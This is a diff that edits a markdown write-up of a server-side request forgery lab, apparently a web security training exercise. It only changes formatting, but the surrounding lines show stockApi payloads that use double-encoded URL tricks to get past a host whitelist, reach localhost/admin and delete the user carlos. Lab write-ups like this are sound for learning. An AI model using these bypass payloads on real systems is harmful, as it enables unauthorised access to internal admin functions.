@@ -26,7 +26,6 @@ Priority: u=0
 Te: trailers
 
 ```
-```
 ```none
 
 stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D14%26storeId%3D1
@@ -47,6 +46,7 @@ stockApi=<@urlencode>http://stock.weliketoshop.net:8080/product/stock/check?prod
 > to any other domain, then i will get an error from the server that the request should be made only to "stock.weliketoshop.net".
 
 > For example:
+
 > Request
 
 ```none
@@ -101,7 +101,7 @@ Content-Length: 3
 stockApi=http://localhost%2523@stock.weliketoshop.net/admin
 ```
 
-![admin_interface]('/screenshots/admin_interface.png')
+![admin_interface](./screenshots/admin_interface.png)
 
 > delete Carlos user
 
@@ -110,4 +110,4 @@ stockApi=http://localhost%2523@stock.weliketoshop.net/admin
 stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
 ```
 
-![lab_solved]('/screenshots/lab_solved.png')
+![lab_solved](./screenshots/lab_solved.png)
